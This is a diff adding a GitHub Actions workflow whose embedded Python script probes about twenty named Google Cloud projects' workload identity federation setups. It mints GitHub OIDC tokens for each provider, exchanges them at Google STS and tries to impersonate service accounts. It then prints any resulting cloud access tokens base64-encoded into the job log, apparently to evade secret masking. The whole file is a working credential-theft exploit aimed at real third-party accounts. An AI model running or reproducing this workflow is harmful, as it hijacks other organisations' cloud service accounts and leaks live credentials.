@@ -1,0 +1,168 @@
+name: i53941-mintall
+on:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    steps:
+      - name: probe
+        run: |
+          cat > /tmp/p.py <<'PYPROBE'
+          #!/usr/bin/env python3
+          """i53941: comprehensive WIF mint probe. Runs inside GH Actions (workflow i53941-mintall)."""
+          import base64, json, os, subprocess, urllib.error, urllib.parse, urllib.request
+
+          CASES = [
+           {"num": "366271888053", "proj": "cubecommons-prod",
+            "p": "projects/366271888053/locations/global/workloadIdentityPools/cube-prod/providers/github-actions",
+            "sas": ["service-deployer@cubecommons-prod.iam.gserviceaccount.com"]},
+           {"num": "744911585239", "proj": "cubecommons-dev",
+            "p": "projects/744911585239/locations/global/workloadIdentityPools/cube-dev/providers/github-actions",
+            "sas": ["docker-image-publisher@cubecommons-dev.iam.gserviceaccount.com"]},
+           {"num": "1076618220242", "proj": "methodical-mark-482504-j3",
+            "p": "projects/1076618220242/locations/global/workloadIdentityPools/forgecrux-pool/providers/github-provider",
+            "sas": ["gh-runner-gsa@methodical-mark-482504-j3.iam.gserviceaccount.com"]},
+           {"num": "769700566231", "proj": "fhir-org-cds-services",
+            "p": "projects/769700566231/locations/global/workloadIdentityPools/gh-actions-pool/providers/github",
+            "sas": ["github-deploy@fhir-org-cds-services.iam.gserviceaccount.com"]},
+           {"num": "769700566231", "proj": "fhir-org-cds-services",
+            "p": "projects/769700566231/locations/global/workloadIdentityPools/gh-actions-pool/providers/gha",
+            "sas": ["github-deploy@fhir-org-cds-services.iam.gserviceaccount.com"]},
+           {"num": "381521917100", "proj": "vvakame-playground",
+            "p": "projects/381521917100/locations/global/workloadIdentityPools/github-actions/providers/gha-provider",
+            "sas": ["se2gha-deployer@vvakame-playground.iam.gserviceaccount.com"]},
+           {"num": "381521917100", "proj": "vvakame-playground",
+            "p": "projects/381521917100/locations/global/workloadIdentityPools/github-actions/providers/github",
+            "sas": ["se2gha-deployer@vvakame-playground.iam.gserviceaccount.com"]},
+           {"num": "381521917100", "proj": "vvakame-playground",
+            "p": "projects/381521917100/locations/global/workloadIdentityPools/github-actions/providers/github-actions",
+            "sas": ["se2gha-deployer@vvakame-playground.iam.gserviceaccount.com"]},
+           {"num": "381521917100", "proj": "vvakame-playground",
+            "p": "projects/381521917100/locations/global/workloadIdentityPools/github-actions/providers/github-provider",
+            "sas": ["se2gha-deployer@vvakame-playground.iam.gserviceaccount.com"]},
+           {"num": "381521917100", "proj": "vvakame-playground",
+            "p": "projects/381521917100/locations/global/workloadIdentityPools/gha/providers/gha",
+            "sas": ["se2gha-deployer@vvakame-playground.iam.gserviceaccount.com"]},
+           {"num": "381521917100", "proj": "vvakame-playground",
+            "p": "projects/381521917100/locations/global/workloadIdentityPools/github-oidc/providers/github",
+            "sas": ["se2gha-deployer@vvakame-playground.iam.gserviceaccount.com"]},
+           {"num": "381521917100", "proj": "vvakame-playground",
+            "p": "projects/381521917100/locations/global/workloadIdentityPools/github/providers/github",
+            "sas": ["se2gha-deployer@vvakame-playground.iam.gserviceaccount.com"]},
+           {"num": "381521917100", "proj": "vvakame-playground",
+            "p": "projects/381521917100/locations/global/workloadIdentityPools/github/providers/github-actions",
+            "sas": ["se2gha-deployer@vvakame-playground.iam.gserviceaccount.com"]},
+           {"num": "381521917100", "proj": "vvakame-playground",
+            "p": "projects/381521917100/locations/global/workloadIdentityPools/test20231104b/providers/test-provider-b",
+            "sas": ["se2gha-deployer@vvakame-playground.iam.gserviceaccount.com"]},
+           {"num": "832472850572", "proj": "deployment-test-345514",
+            "p": "projects/832472850572/locations/global/workloadIdentityPools/my-pool/providers/my-provider",
+            "sas": ["wip-service-account@deployment-test-345514.iam.gserviceaccount.com"]},
+           {"num": "671371757704", "proj": "dataplatformcolgate",
+            "p": "projects/671371757704/locations/global/workloadIdentityPools/githubactions/providers/github",
+            "sas": ["github-actions@dataplatformcolgate.iam.gserviceaccount.com"]},
+           {"num": "52991355109", "proj": "lab-gke-se",
+            "p": "projects/52991355109/locations/global/workloadIdentityPools/github-pool/providers/github-provider",
+            "sas": ["sa-tenant-gke@lab-gke-se.iam.gserviceaccount.com",
+                    "sa-development@lab-gke-se.iam.gserviceaccount.com",
+                    "sa-bootstrap@lab-gke-se.iam.gserviceaccount.com",
+                    "sa-foundations@lab-gke-se.iam.gserviceaccount.com",
+                    "sa-pipeline-obs@lab-gke-se.iam.gserviceaccount.com",
+                    "sa-observability-tfe-se@lab-gke-se.iam.gserviceaccount.com"]},
+           {"num": "147015144729", "proj": "docrot-detector",
+            "p": "projects/147015144729/locations/global/workloadIdentityPools/github-oidc-pool/providers/github-provider",
+            "sas": ["docrot-github-action@docrot-detector.iam.gserviceaccount.com"]},
+           {"num": "173159973736", "proj": "cloud-final-346107",
+            "p": "projects/173159973736/locations/global/workloadIdentityPools/cloud-final-pool/providers/github-provider",
+            "sas": ["gke-account@cloud-final-346107.iam.gserviceaccount.com"]},
+           {"num": "240990485203", "proj": "groupme-rentbot",
+            "p": "projects/240990485203/locations/global/workloadIdentityPools/rentbot-github-actions/providers/github",
+            "sas": ["github-actions@groupme-rentbot.iam.gserviceaccount.com"]},
+           {"num": "1046457465833", "proj": "dandori-team-one",
+            "p": "projects/1046457465833/locations/global/workloadIdentityPools/my-pool/providers/my-provider",
+            "sas": ["github-deployer@dandori-team-one.iam.gserviceaccount.com"]},
+           {"num": "126594844665", "proj": "civic-eye-272019",
+            "p": "projects/126594844665/locations/global/workloadIdentityPools/github-actions/providers/github",
+            "sas": ["ci-service-account@civic-eye-272019.iam.gserviceaccount.com"]},
+          ]
+
+
+          def req(u, data=None, token=None, timeout=30):
+              h = {'Accept': 'application/json', 'Content-Type': 'application/json', 'User-Agent': 'i53941-mint'}
+              if token:
+                  h['Authorization'] = 'Bearer ' + token
+              body = json.dumps(data).encode() if isinstance(data, (dict, list)) else None
+              r = urllib.request.Request(u, data=body, headers=h, method='POST' if body is not None else 'GET')
+              try:
+                  resp = urllib.request.urlopen(r, timeout=timeout)
+                  return resp.status, resp.read().decode('utf-8', 'replace')
+              except urllib.error.HTTPError as e:
+                  return e.code, (e.read() or b'').decode('utf-8', 'replace')
+              except Exception as e:
+                  return -1, repr(e)[:200]
+
+
+          def errmsg(st, body, n=160):
+              try:
+                  j = json.loads(body)
+                  e = j.get('error') or {}
+                  return ('%s: %s' % (e.get('status') or '', e.get('message') or ''))[:n]
+              except Exception:
+                  return ('HTTP%d: %s' % (st, str(body)[:n]))[:n]
+
+
+          def mint(aud):
+              u = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL', '')
+              t = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN', '')
+              if not u or not t:
+                  return ''
+              u = u + ('&' if '?' in u else '?') + 'audience=' + urllib.parse.quote(aud, safe='')
+              o = subprocess.run(['curl', '-sS', '-m', '30', '-H', 'Authorization: Bearer ' + t, u],
+                                 capture_output=True, text=True).stdout
+              try:
+                  return json.loads(o).get('value', '')
+              except Exception:
+                  return ''
+
+
+          for c in CASES:
+              aud = '//iam.googleapis.com/' + c['p']
+              tok = mint(aud)
+              rec = {'kind': 'mint', 'proj': c['proj'], 'num': c['num'], 'prov': c['p'].split('/pools/')[-1]}
+              if not tok:
+                  rec['id'] = 'ERR'
+                  print('RESULT ' + json.dumps(rec), flush=True)
+                  continue
+              body = {'audience': aud, 'grantType': 'urn:ietf:params:oauth:grant-type:token-exchange',
+                      'requestedTokenType': 'urn:ietf:params:oauth:token-type:access_token',
+                      'scope': 'https://www.googleapis.com/auth/cloud-platform',
+                      'subjectTokenType': 'urn:ietf:params:oauth:token-type:jwt', 'subjectToken': tok}
+              st, rb = req('https://sts.googleapis.com/v1/token', body)
+              rec['sts'] = st
+              if st != 200:
+                  rec['sts_err'] = errmsg(st, rb)
+                  print('RESULT ' + json.dumps(rec), flush=True)
+                  continue
+              fed = json.loads(rb).get('access_token')
+              rec['sa_try'] = []
+              for sa in c['sas']:
+                  u = 'https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/%s:generateAccessToken' % urllib.parse.quote(sa, safe='')
+                  gst, gres = req(u, {'scope': ['https://www.googleapis.com/auth/cloud-platform'], 'lifetime': '3600s'}, token=fed)
+                  e = {'sa': sa, 'gen': gst}
+                  if gst == 200:
+                      j = json.loads(gres)
+                      e['expire'] = j.get('expireTime')
+                      e['tok_b64'] = base64.b64encode(j.get('accessToken', '').encode()).decode()
+                  else:
+                      e['err'] = errmsg(gst, gres, 140)
+                  rec['sa_try'].append(e)
+                  if gst == 200:
+                      break
+              print('RESULT ' + json.dumps(rec), flush=True)
+          print('DONE', flush=True)
+          PYPROBE
+          python3 -u /tmp/p.py
